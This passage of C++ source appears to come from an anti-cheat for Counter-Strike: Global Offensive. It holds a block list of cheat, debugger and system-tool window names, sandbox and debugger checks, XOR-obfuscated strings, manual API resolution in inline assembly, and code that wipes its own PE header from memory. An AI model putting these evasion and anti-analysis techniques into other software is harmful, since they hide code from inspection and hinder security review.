		GetProcId("SbieSvc*32.exe"); // < sandbox 
		GetProcId("SbieSvc*32.exe"); // < sandbox 
		GetProcId("SbieCtrl.exe");   // < sandbox 
		Sleep(300);
	}
}

void TitleCheckWindow()
{
	JUNK_CODE_TWO
	while (1)
	{
		HideFromDebugger();
		TitleWindow("!xSpeed 6.0");
		TitleWindow("!xSpeed 6.0");
		TitleWindow("!xSpeed.net 2");
		TitleWindow("!xSpeed.net 3");
		TitleWindow("!xSpeed.net 6");
		TitleWindow("!xSpeed.net");
		TitleWindow("!xSpeedPro");
		TitleWindow("!xpeed.net 1.41");
		TitleWindow("99QJ MU Bot");
		TitleWindow("AE Bot v1.0 beta");
		TitleWindow("AIO Bots");
		TitleWindow("Add address");
		TitleWindow("ArtMoney PRO v7.27");
		TitleWindow("ArtMoney SE v7.31");
		TitleWindow("ArtMoney SE v7.32");
		TitleWindow("Auto Combo");
		TitleWindow("Auto-Repairer");
		TitleWindow("AutoBuff D-C");
		TitleWindow("AutoBuff");
		TitleWindow("AutoCombo D-C By WANTED");
		TitleWindow("AutoCombo");
		TitleWindow("Auto_Buff v5 Hack Rat");
		TitleWindow("Autoprision");
		TitleWindow("Bot MG-DK-ELF");
		TitleWindow("CapoteCheatfreadcompany");
		TitleWindow("Capotecheat");
		TitleWindow("Capotecheat(deltacholl)");
		TitleWindow("Catastrophe v0.1");
		TitleWindow("Catastrophe v1.2");
		TitleWindow("Catastrophe");
		TitleWindow("Chaos Bot 2.1.0");
		TitleWindow("CharBlaster");
		TitleWindow("CharEditor (www.darkhacker.com.ar)");
		TitleWindow("Cheat Engine 5.0");
		TitleWindow("Cheat Engine 5.1");
		TitleWindow("Cheat Engine 5.1.1");
		TitleWindow("Cheat Engine 5.2");
		TitleWindow("Cheat Engine 5.3");
		TitleWindow("Cheat Engine 5.4");
		TitleWindow("Cheat Engine 5.5");
		TitleWindow("Cheat Engine 5.6");
		TitleWindow("Cheat Engine 5.6.1");
		TitleWindow("Cheat Engine 6.0");
		TitleWindow("Cheat Engine 6.1");
		TitleWindow("Cheat Engine 6.4");
		TitleWindow("Cheat Engine");
		TitleWindow("Cheat Happens v3.95b1/b2");
		TitleWindow("Cheat Happens v3.95b3");
		TitleWindow("Cheat Happens v3.96b2");
		TitleWindow("Cheat Happens v3.9b1");
		TitleWindow("Cheat Happens");
		TitleWindow("Cheat Master");
		TitleWindow("Cheat4Fun v0.9 Beta");
		TitleWindow("Cheat4Fun");
		TitleWindow("CheatHappens");
		TitleWindow("Codehitcz");
		TitleWindow("Created processes");
		TitleWindow("D-C Bypass");
		TitleWindow("D-C DupeHack 1.0");
		TitleWindow("D-C Master Inject v1.0 by WANTED");
		TitleWindow("DC Mu 1.04x _F3R_ Hack");
		TitleWindow("DC-BYPASS By DjCheats  Public Vercion");
		TitleWindow("DK(AE)MultiStrikeByDude");
		TitleWindow("DarkCheats Mu Ar");
		TitleWindow("DarkLord Bot v1.1");
		TitleWindow("DarkyStats (www.darkhacker.com.ar)");
		TitleWindow("Dizzys Auto Buff");
		TitleWindow("Dupe-Full");
		TitleWindow("Easy As MuPie");
		TitleWindow("Esperando Mu Online");
		TitleWindow("FunnyZhyper v5");
		TitleWindow("FunnyZhyper");
		TitleWindow("Game Speed Adjuster");
		TitleWindow("Game Speed Changer");
		TitleWindow("GodMode");
		TitleWindow("Godlike");
		TitleWindow("HahaMu 1.16");
		TitleWindow("Hasty MU 0.3");
		TitleWindow("Hasty MU");
		TitleWindow("HastyMU");
		TitleWindow("HastyMu 1.1.0 NEW");
		TitleWindow("HastyMu v0.1");
		TitleWindow("HastyMu v0.2");
		TitleWindow("HastyMu v0.3");
		TitleWindow("HastyMu");
		TitleWindow("HiDeToolz");
		TitleWindow("HideToolz");
		TitleWindow("Hit Count");
		TitleWindow("Hit Hack");
		TitleWindow("Injector");
		TitleWindow("Janopn Mini Multi Cheat v0.1");
		TitleWindow("Jewel Drop Beta");
		TitleWindow("JoyToKey");
		TitleWindow("Kill");
		TitleWindow("Lipsum v1 and v2");
		TitleWindow("Lipsum_v2");
		TitleWindow("Load File");
		TitleWindow("MJB Perfect DL Bot");
		TitleWindow("MLEngine");
		TitleWindow("MU Lite Trainer");
		TitleWindow("MU Utilidades");
		TitleWindow("MU-SS4 Speed Hack 1.2");
		TitleWindow("MUSH");
		TitleWindow("Minimize");
		TitleWindow("ModzMu");
		TitleWindow("MoonLight");
		TitleWindow("Mu Cheater 16");
		TitleWindow("Mu Philiphinas Cheat II");
		TitleWindow("Mu Pie Beta");
		TitleWindow("Mu Pirata MMHack v0.2 by janopn");
		TitleWindow("Mu proxy");
		TitleWindow("MuBot");
		TitleWindow("MuCheat");
		TitleWindow("MuHackRm");
		TitleWindow("MuOnline Speed Hack");
		TitleWindow("MuPie HG v2");
		TitleWindow("MuPie HG v3");
		TitleWindow("MuPie v2 Beta");
		TitleWindow("MuPieHGV2");
		TitleWindow("MuPieHGV3");
		TitleWindow("MuPieX");
		TitleWindow("MuPie_v2Beta");
		TitleWindow("MuProxy");
		TitleWindow("Mugster Bot");
		TitleWindow("Mupie Minimizer");
		TitleWindow("Mush");
		TitleWindow("NoNameMini");
		TitleWindow("Nsauditor 1.9.1");
		TitleWindow("Olly Debugger");
		TitleWindow("Overclock Menu");
		TitleWindow("Perfect AutoPotion");
		TitleWindow("Permit");
		TitleWindow("PeruCheats");
		TitleWindow("ProxCheatsX 2.0 - Acacias");
		TitleWindow("RPE");
		TitleWindow("Razor Code Only");
		TitleWindow("Razor Code");
		TitleWindow("Snd Bot 1.5");
		TitleWindow("Speed Gear 5");
		TitleWindow("Speed Gear 6");
		TitleWindow("Speed Gear v5.00");
		TitleWindow("Speed Gear");
		TitleWindow("Speed Hack 99.62t");
		TitleWindow("Speed Hack Simplifier 1.0-1.2");
		TitleWindow("Speed Hack Simplifier");
		TitleWindow("Speed Hack");
		TitleWindow("Speed Hacker");
		TitleWindow("SpeedGear");
		TitleWindow("SpeedMUVN");
		TitleWindow("SpiffsAutobot");
		TitleWindow("SpotHack 1.1");
		TitleWindow("SpotHack");
		TitleWindow("Stop");
		TitleWindow("Super Bot");
		TitleWindow("T Search");
		TitleWindow("Tablet 2");
		TitleWindow("The following opcodes accessed the selected address");
		TitleWindow("Trade HACK 1.8");
		TitleWindow("Ultimate Cheat");
		TitleWindow("UoPilot  v2.17   WK");
		TitleWindow("UoPilot");
		TitleWindow("VaultBlaster");
		TitleWindow("VaultEditor (www.darkhacker.com.ar)");
		TitleWindow("WPE PRO");
		TitleWindow("WPePro 0.9a");
		TitleWindow("WPePro 1.3");
		TitleWindow("Wall");
		TitleWindow("WildProxy 1.0 Alpha");
		TitleWindow("WildProxy v0.1");
		TitleWindow("WildProxy v0.2");
		TitleWindow("WildProxy v0.3");
		TitleWindow("WildProxy v1.0 Public");
		TitleWindow("WildProxy");
		TitleWindow("Xelerator 1.4");
		TitleWindow("Xelerator 2.0");
		TitleWindow("Xelerator");
		TitleWindow("ZhyperMu Packet Editor");
		TitleWindow("[Dark-Cheats] MultiD-C");
		TitleWindow("eXpLoRer");
		TitleWindow("hacker");
		TitleWindow("rPE - rEdoX Packet Editor");
		TitleWindow("razorcode");
		TitleWindow("speed");
		TitleWindow("speednet");
		TitleWindow("speednet2");
		TitleWindow("www.55xp.com");
		TitleWindow("xSpeed.net 3.0");
		TitleWindow("BVKHEX");
		TitleWindow("OllyDbg");
		TitleWindow("HxD");
		TitleWindow("BY DARKTERRO");
		TitleWindow("Tim Geimi Jaks - DarkTerro");
		Sleep(1000);
	}

}

void ClasseCheckWindow()
{
		HideFromDebugger();
		//ClasseWindow("ConsoleWindowClass"); // Prompt de comando 
		//ClasseWindow("ThunderRT6FormDC");   // autoclic Klic0r
		ClasseWindow("PROCEXPL");             // Process explorer
		ClasseWindow("ProcessHacker");        // Process Hacker	
		ClasseWindow("PhTreeNew");            // Process Hakcer (Process windows)
		ClasseWindow("RegEdit_RegEdit");      // Regedit
		ClasseWindow("0x150114 (1376532)");   // Win 7 - System configuration
		ClasseWindow("SysListView32");        // Lista de processos do process explorer
		ClasseWindow("Tmb");
		ClasseWindow("TformSettings");
		ClasseWindow("Afx:400000:8:10011:0:20575");
		ClasseWindow("TWildProxyMain");
		ClasseWindow("TUserdefinedform");
		ClasseWindow("TformAddressChange");
		ClasseWindow("TMemoryBrowser");
		ClasseWindow("TFoundCodeDialog");
		Sleep(500);
	
}

void Speed_perf()
{
	JUNK_CODE_TWO
		HideFromDebugger();
		//cout << *(unsigned long*)QueryPerformanceCounter <<endl;
		if (*(unsigned long*)QueryPerformanceCounter != 2337669003)
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#29 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}
		Sleep(1000);
	
}

int clientModuleSize;
DWORD clientModuleBase;
char* proccessName;
HANDLE proccessHandle;
int proccesId;
int engineModuleSize;
DWORD engineModuleBase;

DWORD GetModuleBase(LPSTR lpModuleName, int *sizeOut)
{
	char csgo[] = "hxld%nsn";
	Encrypt(csgo, sizeof(csgo));
	proccessName = csgo;
	MODULEENTRY32 lpModuleEntry = { 0 };
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, proccesId);
	if (!hSnapShot)
		return NULL;
	lpModuleEntry.dwSize = sizeof(lpModuleEntry);
	BOOL bModule = Module32First(hSnapShot, &lpModuleEntry);
	while (bModule)
	{
		if (isInCharString(lpModuleEntry.szModule, lpModuleName))
		{
			CloseHandle(hSnapShot);
			*sizeOut = lpModuleEntry.modBaseSize;
			return (DWORD)lpModuleEntry.modBaseAddr;
		}
		bModule = Module32Next(hSnapShot, &lpModuleEntry);
	}
	CloseHandle(hSnapShot);
	return NULL;
}

HANDLE GetProcessByName()
{

	DWORD pid = 0;
	char csgo[] = "hxld%nsn";
	Encrypt(csgo, sizeof(csgo));
	proccessName = csgo;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process))
	{
		do
		{
			if (_stricmp(process.szExeFile, proccessName) == 0)
			{
				pid = process.th32ProcessID;
				proccesId = pid;
				break;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	if (pid != 0)
	{
		return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	}



	return NULL;
}

bool Initialize()
{
	

	if ((proccessHandle = GetProcessByName()) == NULL)
		return false;

	if ((clientModuleBase = GetModuleBase("client.dll", &clientModuleSize)) == NULL)
		return false;

	if ((engineModuleBase = GetModuleBase("engine.dll", &engineModuleSize)) == NULL)
		return false;

	return true;
}

void Launcher_Name()
{
	JUNK_CODE_ONE
	char Tits[] = "Hd~e⌂ny+&+X⌂yb`n1+Lgdijg+Dmmnexb}n";
	Encrypt(Tits, sizeof(Tits));
	char* begin = Tits;   // Points to string beggining
	char* end = Tits + strlen(Tits); // Points to string end
	std::replace(begin, end, '4', 't');
	bool Test = false;
	std::thread::id LanucherName = std::this_thread::get_id();
	while (1)
	{
		HideFromDebugger();
		if (Initialize() || Test)
		{
			
			HWND WinTitle = FindWindowA(NULL, "Counter-Strike: Global Offensive");
			if (WinTitle == 0) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#28 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			Test = true;
		}
		else
		{
			char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
			Encrypt(ntdll1, sizeof(ntdll1));
			char* begin1 = ntdll1;   // Points to string beggining
			char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
			std::replace(begin1, end1, '4', 't');
			char ntdll[] = "hxld%nsn";
			Encrypt(ntdll, sizeof(ntdll));
			GetProcId(ntdll);
			MessageBox(NULL, "#27 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
			Sleep(30);
			exit(1);
		}
		Sleep(300);
	}
}

BOOL IsRunAsAdministrator()
{
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pAdministratorsGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:

	if (pAdministratorsGroup)
	{
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}
	return fIsRunAsAdmin;
}

void CheckAdmin()
{
	JUNK_CODE_TWO
		HideFromDebugger();
	if (IsRunAsAdministrator())
	{
		Sleep(3);
	}
	else
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#26 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}

}

int readHex(istream& istr)
{
	int value;
	istr >> hex >> value;
	return value;
}

PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pImageBase)
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
	return (PIMAGE_NT_HEADERS)(pImageBase + pImageDosHeader->e_lfanew);
}

EXCEPTION_DISPOSITION ExceptionRoutine(
	PEXCEPTION_RECORD ExceptionRecord,
	PVOID             EstablisherFrame,
	PCONTEXT          ContextRecord,
	PVOID             DispatcherContext)
{
	if (EXCEPTION_INVALID_HANDLE == ExceptionRecord->ExceptionCode)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#25 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	return ExceptionContinueExecution;
}

bool IsitaSandBox()
{
	unsigned char bBuffering;
	unsigned long aCreateProcesses = (unsigned long)GetProcAddress(GetModuleHandle("KERNEL32.dll"), "CreateProcessA");


	HANDLE CurrentHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	ReadProcessMemory(CurrentHandle, (void *)aCreateProcesses, &bBuffering, 1, 0);

	if (bBuffering == 0xE9)
	{
		return  1;
	}
	else {
		return 0;
	}

}

bool ModuleCheck() //Return TRUE/FALSE .
{
	char ntdll[] = "XibnOgg%ogg";
	Encrypt(ntdll, sizeof(ntdll));
	char* begin1 = ntdll;   // Points to string beggining
	char* end1 = ntdll + strlen(ntdll); // Points to string end
	std::replace(begin1, end1, '4', 't');

	char ntdll1[] = "j{bTgdl%ogg";
	Encrypt(ntdll1, sizeof(ntdll1));
	char* begin11 = ntdll1;   // Points to string beggining
	char* end11 = ntdll1 + strlen(ntdll1); // Points to string end
	std::replace(begin11, end11, '4', 't');

	char ntdll2[] = "obyT|j⌂hc%ogg";
	Encrypt(ntdll2, sizeof(ntdll2));
	char* begin12 = ntdll2;   // Points to string beggining
	char* end12 = ntdll2 + strlen(ntdll2); // Points to string end
	std::replace(begin12, end12, '4', 't');

	char ntdll3[] = "oilcng{%ogg";
	Encrypt(ntdll3, sizeof(ntdll3));
	char* begin13 = ntdll3;   // Points to string beggining
	char* end13 = ntdll3 + strlen(ntdll3); // Points to string end
	std::replace(begin13, end13, '4', 't');

	char* sModules[] = { ntdll, ntdll1, ntdll2, ntdll3 };//define module names
	for (int i = 0; i < (sizeof(sModules) / sizeof(char*)); i++)  //for looping to get the module handle .
	{
		if (GetModuleHandle(sModules[i]))  //getting module handle.
		{
			return TRUE; //if exists return TRUE .
		}
	}

	return FALSE;  //if not return FALSE.
}

void AllToUpper(char* str, unsigned long len)
{
	for (unsigned long c = 0; c<len; c++)
	{
		if (str[c] >= 'a' && str[c] <= 'z')
		{
			str[c] -= 32;
		}
	}
}

unsigned char* ScanDataForString(unsigned char* data, unsigned long data_length, unsigned char* string2)
{
	unsigned long string_length = strlen((char*)string2);
	for (unsigned long i = 0; i <= (data_length - string_length); i++)
	{
		if (strncmp((char*)(&data[i]), (char*)string2, string_length) == 0) return &data[i];
	}
	return 0;
}

bool flag = false;

int __cdecl Handler(EXCEPTION_RECORD* pRec, void* est, unsigned char* pContext, void* disp)
{
	if (pRec->ExceptionCode == 0xC000001D || pRec->ExceptionCode == 0xC000001E || pRec->ExceptionCode == 0xC0000005)
	{
		flag = true;
		(*(unsigned long*)(pContext + 0xB8)) += 5;
		return ExceptionContinueExecution;
	}
	return ExceptionContinueSearch;
}

__declspec(noinline) HMODULE WINAPI LoadLibraryWrapper(LPCWSTR lpLibFilename)
{
	return 0;
	//return LoadLibraryW(lpLibFilename);
}

__declspec(naked) __forceinline void GetProcAsm()
{
	_asm
	{
		add    esp, -2 * 4 - 4 * 4; room for 4 registers and 2 local variables
		mov[esp + 2 * 4 + 0 * 4], edi; saving registers
		mov[esp + 2 * 4 + 1 * 4], ebp;
		mov[esp + 2 * 4 + 2 * 4], esi;
		mov[esp + 2 * 4 + 3 * 4], ebx;
		mov    dword ptr[esp + 1 * 4], 0; [esp + 1 * 4]->clear flag for forwarded proc
			GetStart : ;
		mov    edx, [esp + 2 * 4 + 4 * 4 + 2 * 4]; edx->lp Dll name
			mov    ebp, 20h; ebp->BaseDllName address(Unicode)
			cmp    byte ptr[edx + 1], 3Ah; "c:\...." Is it full path or just dll name ?
			jne    a;
		mov    ebp, 18h; ebp->FullDllName(Unicode)
			a:;
		; Get module base address...............;
		mov    eax, fs:[30h]; PEB base in eax
			cmp    dword ptr[esp + 1 * 4], -1; If it is forwarded esi->ntdll.dll
			mov    eax, [eax + 0Ch]; eax->PEB_LDR_DATA
			mov    edi, edx; edi->lp Dll name
			mov    esi, [eax + 1Ch]; esi-> 1st entry in InitOrderModuleList
			je     b; else
			mov    esi, [esi]; esi->Kernel32.dll
			b : ;
		mov    eax, [esi + ebp]; eax->BaseDllName or FullDllName(Unicode)
			mov    ebx, esi; ebx->the 1st LDR_MODULE in the chain
			; Comparing strings ....................;
		;
	FindNextCharw:;
		mov    ch, [eax]; eax->BaseDllName or FullDllName(Unicode)
			add    eax, 2;
		cmp    ch, 5Ah;
		ja     c;
		cmp    ch, 41h;
		jl     c;
		or ch, 20h;
	c:;
		mov    cl, [edx]; edx->lp dll name string "." or zero ended
			add    edx, 1;
		cmp    cl, 5Ah;
		ja     d;
		cmp    cl, 41h;
		jl     d;
		or cl, 20h;
	d:;
		cmp    cl, ch;
		jne    Next_LDRw;
		test   ch, ch;
		je     e;
		cmp    ch, 2Eh; "."
			jne    FindNextCharw;
		cmp    dword ptr[esp + 1 * 4], -1; flag for forwarded proc->If it is forwarded
			jne    FindNextCharw;           copy until ".", else until zero
			e : ;
		mov    ebx, [esi + 8]; ebx->Base Dll Name address
			je     GetNextApi;
		;
		; Next forward LDR_MODULE ..............;
	Next_LDRw:;
		mov    esi, [esi]; we go forwards
			mov    edx, edi; edx->lp Dll name
			mov    eax, [esi + ebp]; eax->BaseDllName or FullDllName(Unicode) address
			test   eax, eax
			jz	  Next_LDRw
			cmp    ebx, esi; If current module = 1st module->Dll is Not Loaded
			jne    FindNextCharw;
		;
		; The module is not loaded in memory and;
		; we will try LoadLibrary to load it....;
		jmp End_NotFound;  Disabled for now
			cmp    dword ptr[esp + 1 * 4], -1; If it is forwarded
			je     Forwarded_Dll; copy dll name in the stack and call oadLibrary
			xor    ebx, ebx; ebx = 0
			push		edx
			call LoadLibraryWrapper; call API
			add    ebx, eax; ebx->BaseDllName address or zero
			je     End_NotFound; No such dll->exit with ebx = 0->error
			; End of Get module base address........;
		;
	GetNextApi:;
		mov    edx, [ebx + 3Ch]; edx->beginning of PE header
			mov    esi, ebx; ebp->current dll base address
			mov    edi, [ebx + edx + 78h]; edi->RVA of ExportDirectory -> 78h
			mov    ecx, [ebx + edx + 7Ch]; ecx->RVA of ExportDirectorySize ->7Ch
			add    esi, [ebx + edi + 20h]; esi->AddressOfNames ->20h
			add    edi, ebx; ebx->current dll base address
			movd   MM5, edi; MM5->edi->ExportDirectory
			mov    ebp, [esp + 1 * 4 + (4 * 4 + 2 * 4)]; ebp->proc name address or ordinal value
			add    ecx, edi; ecx = ExportDirectory address + ExportDirectorySize
			mov    eax, [edi + 18h]; eax = num of API Names->nMax NumberOfNames->18h
			test   ebp, 0ffff0000h; is it proc name address or ordinal value ?
			mov[esp + 0 * 4], ecx; [esp + 0 * 4] = ExportDirectory address + ExportDirectorySize
			je     GetByOrdinal; GetProcAddress by Ordinal
			;
		; Binary search ........................; GetProcAddress by Name
			movd   MM7, esp; save the stack here
			movzx  ecx, byte ptr[ebp]; ebp->proc name address
			lea    edi, [esi + 4];      cl-> 1st character of the proc name
			mov    esp, ebx; esp->current dll base address
			neg    edi; set carry flag
			movd   MM6, edi; MM6 = -(esi + 4]
			Bin_Search:;
					   ; cmova  esi, edx; see Note 1
						   sbb    edi, edi; edi->mask - 1 or 0
						   xor esi, edx; mix esi and edx
						   and    esi, edi; esi = esi or esi = 0
						   mov    ebx, esp; ebx->current dll base address
						   xor    esi, edx; esi = esi or esi = edx
						   shr    eax, 1;
					   je     End_ZeroIndex;
				   IndexIsZero:;
					   add    ebx, [esi + 4 * eax];
					   lea    edx, [esi + 4 * eax + 4];
					   cmp    cl, [ebx]; ebx->API Names Table
						   jne    Bin_Search;
					   ; End Binary search ....................;
					   ;
					   ; Compare next bytes of two strings.....;
					   lea    edi, [ebp + 1];
				   f:;
					   mov    ch, [edi]; comparing bytes
						   add    ebx, 1;
					   cmp    ch, [ebx]; ebx->API Names Table
						   jne    Bin_Search;
					   add    edi, 1;
					   test   ch, ch;
					   jne    f;
					   ;
					   ; Extract the index from EDX to get proc address
						   movd   esi, MM5; esi->ExportDirectory
						   movd   eax, MM6; eax-> - (AddressOfNames + 4)
						   mov    edi, [esi + 24h]; edi->AddressOfNameOrdinals ->24h
						   mov    ecx, esp; ecx->current dll base address
						   add    ecx, [esi + 1Ch]; ecx->AddressOfFunctions->1Ch
						   add    eax, edx; edx->[esi + 4 * eax + 4]
						   shr    eax, 1; eax->index->eax * 2 for word table
						   add    edi, esp; esp->current dll base address
						   movzx  eax, word ptr[eax + edi]; eax = Ordinal number for this index
						   mov    ebx, esp; ebx->current dll base address
						   add    ebx, [ecx + eax * 4]; ebx->proc address
						   movd   esp, MM7; restore the stack
						   ; .......................................;
				   Is_it_Forwarded:; check if proc address is inside export directory
					   cmp    esi, ebx; esi->ExportDirectory
					   jnl    EndProc;
								   cmp    ebx, [esp + 0 * 4]; [esp + 0 * 4] = ExportDirectory address + ExportDirectorySize
									   jl     Forwarded;
								   ; .......................................;
							   EndProc:;
								   mov    edi, [esp + 2 * 4 + 0 * 4]; restoring registers
									   mov    eax, ebx; eax->proc address or zero
									   mov    ebp, [esp + 2 * 4 + 1 * 4];
								   mov    esi, [esp + 2 * 4 + 2 * 4];
								   mov    ebx, [esp + 2 * 4 + 3 * 4];
								   add    esp, 2 * 4 + 4 * 4;
								   ret    2 * 4;
								   ; .......................................;
							   End_ZeroIndex:;
								   jc     IndexIsZero; if it is 1st time zero->return,
									   movd   esp, MM7; else (2nd time zero)->restore the stack
									   End_NotFound : ; and exit
									   xor    ebx, ebx; ebx = 0->flag not found
									   je     EndProc;
								   ; .......................................;
							   GetByOrdinal:;
								   cmp    ebp, [esi + 14h]
									   jnl    End_NotFound; esi->ExportDirectory
									   sub    ebp, [esi + 10h]
									   mov    eax, ebx; eax->current dll base address
									   add    eax, [esi + 1Ch]
									   add    ebx, [eax + ebp * 4]; ebx->proc address
									   jne    Is_it_Forwarded;
								   ; .......................................;
							   Forwarded_Dll:;
								   ; Copy dll name in the stack............;
								   xor    eax, eax; eax->index = 0
									   sub    esp, 2048; room for dll name in the stack
									   xor    ebx, ebx; ebx = 0
									   g:;
								   mov    cl, [edx + eax]; edx->lp Dll name->source
									   add    eax, 1;
								   mov[esp + eax - 1], cl; esp->lp target buffer
									   test   cl, cl;
								   je     h;
								   cmp    cl, 2Eh; "."
									   jne    g;
								   mov[esp + eax - 1], ebx; ebx = 0
									   h:;
								   push esp
									   call LoadLibraryWrapper; call API
									   add    esp, 2048; restore the stack
									   add    ebx, eax; ebx->BaseDllName address or zero
									   jne    GetNextApi;
								   je     End_NotFound; No such dll->exit with ebx = 0->error
									   ; .......................................;
							   Forwarded:;
								   mov    eax, ebx; eax->proc address
									   ; Call the proc "recursively"...........;
							   i:;
								   cmp    byte ptr[eax], 2Eh; looking for "."
									   lea    eax, [eax + 1];
								   jne    i;
								   cmp    byte ptr[eax], 23h; Is it forwarded by ordinal ? Ex : "ntdll.#12"
									   je     j;
							   GetProc:;
								   mov    dword ptr[esp + 1 * 4], -1; set flag->it is forwarded
									   mov[esp + 1 * 4 + (4 * 4 + 2 * 4)], eax; eax->offset of proc name or ordinal value
									   mov[esp + 2 * 4 + (4 * 4 + 2 * 4)], ebx; ebx->lp Dll name
									   jmp    GetStart; start it again with new proc name and Dll name and flag
									   j : ;
								   ; A2Dw..................................;
								   lea    edx, [eax + 1];
								   xor    eax, eax;
							   k:;
								   movzx  ecx, byte ptr[edx];
								   add    edx, 1;
								   test   ecx, ecx;
								   je     GetProc;
								   lea    eax, [eax + 4 * eax];
								   lea    eax, [ecx + 2 * eax - 30h]; eax = (eax * 10 + ecx - 30h)
									   jne    k;
								   ; End A2Dw..............................;
	}
}

int GetProcAddr(char* dll, char* name);
int __cdecl GetProcAddr(char* dll, char* name)
{
	int address = 0;
	_asm
	{
		push dll
		push name
		call GetProcAsm
		mov	address, eax
	}

	return address;
}

__forceinline bool IsDbgPresentPrefixCheck()
{
	__try
	{
		__asm pushad
		__asm popad
		__asm __emit 0xF3 // 0xF3 0x64 disassembles as PREFIX REP:
		__asm __emit 0x64
		__asm __emit 0xF1 // One byte INT 1
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		return false;
	}

	return true;
}

__forceinline bool DebugObjectCheck()
{
	// Much easier in ASM but C/C++ looks so much better
	typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)
		(HANDLE, UINT, PVOID, ULONG, PULONG);

	typedef HANDLE(WINAPI *pGetCurrentProcess)(void);

	HANDLE hDebugObject = NULL;
	NTSTATUS Status;

	char ntdll[] = "eogg%ogg";
	char NtQueryInformationProcess[] = "EZ~nyrBemdyfjbde[ydhnxx";
	char GetCurrentProcess[] = "LnH~yyne[ydhnxx";
	char kernel32[] = "`nyeng89%ogg";
	Encrypt(ntdll, sizeof(ntdll));
	Encrypt(NtQueryInformationProcess, sizeof(NtQueryInformationProcess));
	Encrypt(GetCurrentProcess, sizeof(GetCurrentProcess));
	Encrypt(kernel32, sizeof(kernel32));

	// Get NtQueryInformationProcess
	pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddr(ntdll, NtQueryInformationProcess);
	pGetCurrentProcess GetCurrProc = (pGetCurrentProcess)GetProcAddr(kernel32, GetCurrentProcess);

	Status = NtQIP(GetCurrProc(),
		0x1e, // ProcessDebugObjectHandle
		&hDebugObject, 4, NULL);

	if (Status != 0x00000000)
		return false;

	if (hDebugObject)
		return true;
	else
		return false;
}

inline void ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = (char*)GetModuleHandle(NULL);

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	ZeroMemory(pBaseAddr, 4096);
}

__forceinline bool DebuggerDriversPresent()
{
	// an array of common debugger driver device names
	const char drivers[9][20] = {
		"\\\\.\\EXTREM", "\\\\.\\ICEEXT",
		"\\\\.\\NDBGMSG.VXD", "\\\\.\\RING0",
		"\\\\.\\SIWVID", "\\\\.\\SYSER",
		"\\\\.\\TRW", "\\\\.\\SYSERBOOT",
		"\0"
	};
	for (int i = 0; drivers[i][0] != '\0'; i++) {
